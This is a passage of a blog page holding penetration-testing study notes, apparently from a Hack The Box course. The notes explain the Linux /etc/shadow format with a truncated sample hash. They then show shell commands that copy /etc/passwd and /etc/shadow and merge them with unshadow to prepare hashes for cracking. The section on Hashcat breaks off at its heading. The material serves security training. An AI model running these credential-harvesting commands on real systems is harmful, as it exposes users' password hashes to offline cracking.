+<h4 id="Shadow-Format"><a href="#Shadow-Format" class="headerlink" title="Shadow Format"></a>Shadow Format</h4><table>
+<thead>
+<tr>
+<th><code>cry0l1t3</code></th>
+<th><code>:</code></th>
+<th><code>$6$wBRzy$...SNIP...x9cDWUxW1</code></th>
+<th><code>:</code></th>
+<th><code>18937</code></th>
+<th><code>:</code></th>
+<th><code>0</code></th>
+<th><code>:</code></th>
+<th><code>99999</code></th>
+<th><code>:</code></th>
+<th><code>7</code></th>
+<th><code>:</code></th>
+<th><code>:</code></th>
+<th><code>:</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Username</td>
+<td></td>
+<td>Encrypted password</td>
+<td></td>
+<td>Last PW change</td>
+<td></td>
+<td>Min. PW age</td>
+<td></td>
+<td>Max. PW age</td>
+<td></td>
+<td>Warning period</td>
+<td>Inactivity period</td>
+<td>Expiration date</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="Cracking-Linux-Credentials"><a href="#Cracking-Linux-Credentials" class="headerlink" title="Cracking Linux Credentials"></a>Cracking Linux Credentials</h2><h4 id="Unshadow"><a href="#Unshadow" class="headerlink" title="Unshadow"></a>Unshadow</h4><p><code>unshadow</code>: 这是一个系统管理工具，用于合并 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 文件，并输出未加密的密码哈希值。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
+Tanin@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
+Tanin@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
+</code></pre>
+<h4 id="Hashcat-Cracking-Unshadowed-Hashes"><a href="#Hashcat-Cracking-Unshadowed-Hashes" class="headerlink" title="Hashcat - Cracking Unshadowed Hashes"></a>Hashcat - Cracking Unshadowed Hashes</h4>
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
